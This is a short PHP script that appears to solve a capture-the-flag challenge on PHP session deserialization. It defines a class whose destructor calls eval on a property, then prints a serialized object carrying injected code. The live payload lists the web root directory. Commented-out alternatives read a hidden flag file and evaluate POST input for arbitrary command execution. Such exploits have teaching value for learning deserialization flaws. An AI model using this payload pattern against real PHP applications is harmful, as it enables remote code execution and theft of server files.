<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
    #$str='$_POST'."['cmd']);";
    #$str='echo file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"); exit; ';
    $str='print_r(scandir("/opt/lampp/htdocs/"));exit;';
    echo $str;
    $m = new OowoO($str);
    $m->mdzz=$str;
    echo serialize($m);

?>